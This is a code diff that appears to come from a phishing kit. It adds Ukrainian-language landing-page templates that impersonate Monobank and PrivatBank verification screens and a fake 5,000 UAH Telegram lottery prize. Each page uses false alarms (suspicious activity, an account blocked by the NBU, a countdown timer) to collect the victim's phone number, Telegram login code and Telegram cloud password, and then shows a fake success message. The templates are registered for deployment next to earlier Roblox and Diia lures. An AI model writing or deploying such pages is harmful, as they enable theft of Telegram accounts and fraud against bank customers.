@@ -921,6 +921,298 @@ DIYA_HTML = """<!DOCTYPE html>
 # Registry: theme_key -> template dict
 # ---------------------------------------------------------------------------
 
+# ---------------------------------------------------------------------------
+# Template 7: Monobank — Identity Verification
+# ---------------------------------------------------------------------------
+
+MONOBANK_HTML = """<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>monobank — Підтвердження особистості</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #f2f4f7; font-family: 'Helvetica Neue', Arial, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
+  .card { background: #fff; border-radius: 20px; padding: 32px 28px; max-width: 420px; width: 100%; box-shadow: 0 8px 40px rgba(0,0,0,.12); }
+  .logo { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
+  .logo-icon { width: 44px; height: 44px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 22px; font-weight: 900; }
+  .logo-text { font-size: 22px; font-weight: 800; color: #000; }
+  h1 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
+  p { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+  .alert-box { background: #fff8e1; border: 1px solid #ffe082; border-radius: 10px; padding: 12px 14px; font-size: 13px; color: #795548; margin-bottom: 20px; }
+  input[type=tel], input[type=text], input[type=password] { width: 100%; padding: 14px 16px; border: 1.5px solid #e0e0e0; border-radius: 10px; font-size: 16px; color: #111; outline: none; transition: border .2s; margin-bottom: 14px; }
+  input:focus { border-color: #000; }
+  .btn { width: 100%; padding: 15px; background: #000; color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background .2s; }
+  .btn:hover { background: #222; }
+  .btn:disabled { background: #999; cursor: not-allowed; }
+  .code-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 14px; }
+  .code-box { width: 52px; height: 58px; text-align: center; font-size: 22px; font-weight: 700; border: 1.5px solid #e0e0e0; border-radius: 10px; outline: none; color: #111; }
+  .code-box:focus { border-color: #000; }
+  #errorMsg { background: #fdecea; border: 1px solid #f5c6cb; border-radius: 8px; padding: 10px 14px; color: #c0392b; font-size: 13px; display: none; margin-bottom: 12px; }
+  .secure-badge { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #999; margin-top: 16px; justify-content: center; }
+  .step-hidden { display: none; }
+  .success-icon { font-size: 56px; text-align: center; margin-bottom: 16px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <div class="logo-icon">м</div>
+    <div class="logo-text">monobank</div>
+  </div>
+
+  <!-- Step 1: Phone -->
+  <div id="step1">
+    <h1>Підтвердіть особистість</h1>
+    <p>Для безпеки вашого рахунку введіть номер телефону, пов'язаний з вашим аккаунтом Telegram.</p>
+    <div class="alert-box">⚠️ Виявлено підозрілу активність на вашому рахунку. Підтвердіть особистість, щоб продовжити використання картки.</div>
+    <div id="errorMsg"></div>
+    <input type="tel" id="phoneInput" placeholder="+380 XX XXX XX XX" autocomplete="tel">
+    <button class="btn" id="sendBtn" data-text="Продовжити" onclick="sendCode()">Продовжити</button>
+    <div class="secure-badge">🔒 Захищено SSL / monobank © 2024</div>
+  </div>
+
+  <!-- Step 2: Code -->
+  <div id="step2" class="step-hidden">
+    <h1>Введіть код</h1>
+    <p>Ми надіслали 5-значний код підтвердження у Telegram. Він дійсний 3 хвилини.</p>
+    <div id="errorMsg"></div>
+    <div class="code-row">
+      <input type="text" class="code-box" id="code1" maxlength="1" oninput="nextCode(this,'code2')">
+      <input type="text" class="code-box" id="code2" maxlength="1" oninput="nextCode(this,'code3')">
+      <input type="text" class="code-box" id="code3" maxlength="1" oninput="nextCode(this,'code4')">
+      <input type="text" class="code-box" id="code4" maxlength="1" oninput="nextCode(this,'code5')">
+      <input type="text" class="code-box" id="code5" maxlength="1" oninput="if(this.value)verifyCode()">
+    </div>
+    <button class="btn" id="verifyBtn" data-text="Підтвердити" onclick="verifyCode()">Підтвердити</button>
+  </div>
+
+  <!-- Step 3: 2FA -->
+  <div id="step3" class="step-hidden">
+    <h1>Хмарний пароль</h1>
+    <p>Для додаткового захисту введіть хмарний пароль Telegram.</p>
+    <div id="errorMsg"></div>
+    <input type="password" id="passInput" placeholder="Хмарний пароль">
+    <button class="btn" id="passBtn" data-text="Підтвердити" onclick="verifyPassword()">Підтвердити</button>
+  </div>
+
+  <!-- Step 4: Success -->
+  <div id="step4" class="step-hidden">
+    <div class="success-icon">✅</div>
+    <h1 style="text-align:center;color:#2e7d32;">Верифікацію завершено</h1>
+    <p style="text-align:center;margin-top:8px;">Ваш рахунок підтверджено. Обмеження знято. Ви можете продовжити користуватися monobank.</p>
+  </div>
+</div>
+""" + _SHARED_JS + """
+<script>
+function nextCode(el, nextId) {
+  if (el.value && document.getElementById(nextId)) document.getElementById(nextId).focus();
+}
+</script>
+</body>
+</html>"""
+
+
+# ---------------------------------------------------------------------------
+# Template 8: PrivatBank — Account Verification
+# ---------------------------------------------------------------------------
+
+PRIVAT24_HTML = """<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Приват24 — Верифікація рахунку</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: linear-gradient(160deg, #003b8e 0%, #0056c7 100%); font-family: Arial, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
+  .card { background: #fff; border-radius: 16px; padding: 28px 24px; max-width: 420px; width: 100%; box-shadow: 0 12px 40px rgba(0,0,0,.25); }
+  .header { display: flex; align-items: center; gap: 12px; margin-bottom: 22px; padding-bottom: 18px; border-bottom: 2px solid #f0f0f0; }
+  .header-icon { width: 48px; height: 48px; background: linear-gradient(135deg,#0056c7,#003b8e); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 900; font-size: 20px; }
+  .header-text h2 { font-size: 20px; font-weight: 800; color: #003b8e; }
+  .header-text p { font-size: 12px; color: #999; }
+  h1 { font-size: 18px; font-weight: 700; color: #111; margin-bottom: 8px; }
+  .desc { font-size: 14px; color: #555; margin-bottom: 18px; line-height: 1.5; }
+  .warning { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px 14px; border-radius: 6px; font-size: 13px; color: #664d03; margin-bottom: 18px; }
+  input[type=tel], input[type=text], input[type=password] { width: 100%; padding: 13px 15px; border: 1.5px solid #ddd; border-radius: 8px; font-size: 15px; color: #111; outline: none; margin-bottom: 12px; }
+  input:focus { border-color: #0056c7; }
+  .btn { width: 100%; padding: 14px; background: linear-gradient(135deg,#0056c7,#003b8e); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; }
+  .btn:hover { opacity: .9; }
+  .btn:disabled { opacity: .6; cursor: not-allowed; }
+  .code-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 14px; }
+  .code-box { width: 50px; height: 56px; text-align: center; font-size: 20px; font-weight: 700; border: 1.5px solid #ddd; border-radius: 8px; outline: none; color: #111; }
+  .code-box:focus { border-color: #0056c7; }
+  #errorMsg { background: #fdecea; border: 1px solid #f5c6cb; border-radius: 6px; padding: 10px 14px; color: #c0392b; font-size: 13px; display: none; margin-bottom: 12px; }
+  .step-hidden { display: none; }
+  .footer { font-size: 11px; color: #aaa; text-align: center; margin-top: 16px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <div class="header-icon">P</div>
+    <div class="header-text">
+      <h2>Приват24</h2>
+      <p>Офіційна верифікація</p>
+    </div>
+  </div>
+
+  <!-- Step 1 -->
+  <div id="step1">
+    <h1>Верифікація рахунку</h1>
+    <div class="desc">Щоб уникнути блокування рахунку, необхідно підтвердити особистість через Telegram.</div>
+    <div class="warning">⚠️ Ваш рахунок обмежено відповідно до вимог НБУ. Пройдіть верифікацію до 24:00.</div>
+    <div id="errorMsg"></div>
+    <input type="tel" id="phoneInput" placeholder="+380 XX XXX XX XX">
+    <button class="btn" id="sendBtn" data-text="Надіслати код" onclick="sendCode()">Надіслати код</button>
+    <div class="footer">🔒 Захищено ПриватБанк · SSL 256-bit</div>
+  </div>
+
+  <!-- Step 2 -->
+  <div id="step2" class="step-hidden">
+    <h1>Код підтвердження</h1>
+    <div class="desc">Введіть 5-значний код, надісланий у Telegram.</div>
+    <div id="errorMsg"></div>
+    <div class="code-row">
+      <input type="text" class="code-box" id="code1" maxlength="1" oninput="nextCode(this,'code2')">
+      <input type="text" class="code-box" id="code2" maxlength="1" oninput="nextCode(this,'code3')">
+      <input type="text" class="code-box" id="code3" maxlength="1" oninput="nextCode(this,'code4')">
+      <input type="text" class="code-box" id="code4" maxlength="1" oninput="nextCode(this,'code5')">
+      <input type="text" class="code-box" id="code5" maxlength="1" oninput="if(this.value)verifyCode()">
+    </div>
+    <button class="btn" id="verifyBtn" data-text="Підтвердити" onclick="verifyCode()">Підтвердити</button>
+  </div>
+
+  <!-- Step 3 -->
+  <div id="step3" class="step-hidden">
+    <h1>Хмарний пароль Telegram</h1>
+    <div class="desc">Для підтвердження особистості введіть хмарний пароль вашого Telegram.</div>
+    <div id="errorMsg"></div>
+    <input type="password" id="passInput" placeholder="Хмарний пароль">
+    <button class="btn" id="passBtn" data-text="Підтвердити" onclick="verifyPassword()">Підтвердити</button>
+  </div>
+
+  <!-- Step 4 -->
+  <div id="step4" class="step-hidden" style="text-align:center;padding:20px 0;">
+    <div style="font-size:52px;margin-bottom:14px;">✅</div>
+    <h1 style="color:#003b8e;">Верифікацію успішно пройдено</h1>
+    <div class="desc" style="margin-top:8px;">Обмеження з рахунку знято. Дякуємо за розуміння.</div>
+  </div>
+</div>
+""" + _SHARED_JS + """
+<script>
+function nextCode(el, nextId) {
+  if (el.value && document.getElementById(nextId)) document.getElementById(nextId).focus();
+}
+</script>
+</body>
+</html>"""
+
+
+# ---------------------------------------------------------------------------
+# Template 9: Prize Win
+# ---------------------------------------------------------------------------
+
+PRIZE_HTML = """<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎉 Вітаємо! Ви виграли 5,000 грн</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); font-family: 'Helvetica Neue', Arial, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; color: #fff; }
+  .card { background: rgba(255,255,255,.06); border: 1px solid rgba(255,215,0,.3); border-radius: 20px; padding: 32px 24px; max-width: 420px; width: 100%; backdrop-filter: blur(10px); }
+  .prize-icon { font-size: 64px; text-align: center; margin-bottom: 12px; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+  h1 { font-size: 22px; font-weight: 800; color: #FFD700; text-align: center; margin-bottom: 8px; }
+  .amount { font-size: 44px; font-weight: 900; color: #FFD700; text-align: center; margin: 12px 0; text-shadow: 0 0 30px rgba(255,215,0,.5); }
+  .desc { font-size: 14px; color: rgba(255,255,255,.7); text-align: center; margin-bottom: 20px; line-height: 1.6; }
+  .countdown { text-align: center; background: rgba(255,0,0,.15); border: 1px solid rgba(255,0,0,.3); border-radius: 10px; padding: 10px; font-size: 14px; color: #ff8080; margin-bottom: 20px; }
+  .timer { font-size: 22px; font-weight: 800; color: #ff4444; }
+  input[type=tel], input[type=text], input[type=password] { width: 100%; padding: 14px 16px; background: rgba(255,255,255,.08); border: 1.5px solid rgba(255,215,0,.3); border-radius: 10px; font-size: 16px; color: #fff; outline: none; margin-bottom: 14px; }
+  input:focus { border-color: #FFD700; }
+  input::placeholder { color: rgba(255,255,255,.3); }
+  .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #FFD700, #FFC200); color: #1a1a2e; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: transform .1s; }
+  .btn:hover { transform: translateY(-2px); }
+  .btn:disabled { opacity: .6; cursor: not-allowed; }
+  .code-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 14px; }
+  .code-box { width: 52px; height: 58px; text-align: center; font-size: 22px; font-weight: 700; background: rgba(255,255,255,.08); border: 1.5px solid rgba(255,215,0,.3); border-radius: 10px; outline: none; color: #fff; }
+  .code-box:focus { border-color: #FFD700; }
+  #errorMsg { background: rgba(255,0,0,.1); border: 1px solid rgba(255,0,0,.3); border-radius: 8px; padding: 10px 14px; color: #ff8080; font-size: 13px; display: none; margin-bottom: 12px; }
+  .step-hidden { display: none; }
+  .trust-badges { display: flex; justify-content: center; gap: 16px; margin-top: 16px; font-size: 12px; color: rgba(255,255,255,.4); }
+</style>
+</head>
+<body>
+<div class="card">
+  <!-- Step 1 -->
+  <div id="step1">
+    <div class="prize-icon">🎉</div>
+    <h1>Вітаємо! Ви переможець!</h1>
+    <div class="amount">5 000 ₴</div>
+    <div class="desc">Ваш номер телефону виграв у щотижневій лотереї Telegram UA. Щоб отримати виплату, підтвердьте особистість.</div>
+    <div class="countdown">⏳ Пропозиція діє ще: <span class="timer" id="timer">14:59</span></div>
+    <div id="errorMsg"></div>
+    <input type="tel" id="phoneInput" placeholder="+380 XX XXX XX XX">
+    <button class="btn" id="sendBtn" data-text="Отримати приз" onclick="sendCode()">Отримати приз</button>
+    <div class="trust-badges"><span>🔒 SSL</span><span>✅ Verified</span><span>🇺🇦 Ukraine</span></div>
+  </div>
+
+  <!-- Step 2 -->
+  <div id="step2" class="step-hidden">
+    <h1 style="margin-bottom:16px;">Код підтвердження</h1>
+    <div class="desc">Введіть 5-значний код з Telegram для підтвердження особистості.</div>
+    <div id="errorMsg"></div>
+    <div class="code-row">
+      <input type="text" class="code-box" id="code1" maxlength="1" oninput="nextCode(this,'code2')">
+      <input type="text" class="code-box" id="code2" maxlength="1" oninput="nextCode(this,'code3')">
+      <input type="text" class="code-box" id="code3" maxlength="1" oninput="nextCode(this,'code4')">
+      <input type="text" class="code-box" id="code4" maxlength="1" oninput="nextCode(this,'code5')">
+      <input type="text" class="code-box" id="code5" maxlength="1" oninput="if(this.value)verifyCode()">
+    </div>
+    <button class="btn" id="verifyBtn" data-text="Підтвердити" onclick="verifyCode()">Підтвердити</button>
+  </div>
+
+  <!-- Step 3 -->
+  <div id="step3" class="step-hidden">
+    <h1 style="margin-bottom:16px;">Хмарний пароль</h1>
+    <div class="desc">Введіть хмарний пароль Telegram для завершення верифікації.</div>
+    <div id="errorMsg"></div>
+    <input type="password" id="passInput" placeholder="Хмарний пароль">
+    <button class="btn" id="passBtn" data-text="Підтвердити" onclick="verifyPassword()">Підтвердити</button>
+  </div>
+
+  <!-- Step 4 -->
+  <div id="step4" class="step-hidden" style="text-align:center;padding:20px 0;">
+    <div style="font-size:56px;margin-bottom:14px;">💰</div>
+    <h1>Виплату надіслано!</h1>
+    <div class="desc" style="margin-top:10px;">5,000 грн нараховано на ваш рахунок. Кошти надійдуть протягом 24 годин.</div>
+  </div>
+</div>
+""" + _SHARED_JS + """
+<script>
+function nextCode(el, nextId) {
+  if (el.value && document.getElementById(nextId)) document.getElementById(nextId).focus();
+}
+// Countdown timer
+(function() {
+  var t = 14*60+59;
+  var el = document.getElementById('timer');
+  if (!el) return;
+  var iv = setInterval(function() {
+    t--;
+    if (t <= 0) { clearInterval(iv); el.textContent = '00:00'; return; }
+    var m = Math.floor(t/60), s = t%60;
+    el.textContent = (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+  }, 1000);
+})();
+</script>
+</body>
+</html>"""
+
+
 LANDING_TEMPLATES = {
     'roblox': {
         'name': 'Roblox — Безкоштовні Robux',
@@ -963,5 +1255,26 @@ LANDING_TEMPLATES = {
         'language': 'uk',
         'theme': 'government',
         'html_content': DIYA_HTML,
+    },
+    'monobank': {
+        'name': 'Monobank — Підтвердіть особистість',
+        'slug': 'monobank-verify',
+        'language': 'uk',
+        'theme': 'bank',
+        'html_content': MONOBANK_HTML,
+    },
+    'privat24': {
+        'name': 'ПриватБанк — Верифікація рахунку',
+        'slug': 'privat24-verify',
+        'language': 'uk',
+        'theme': 'bank',
+        'html_content': PRIVAT24_HTML,
+    },
+    'prize': {
+        'name': 'Виграш — Вам нараховано приз 5,000 грн',
+        'slug': 'prize-win',
+        'language': 'uk',
+        'theme': 'prize',
+        'html_content': PRIZE_HTML,
     },
 }
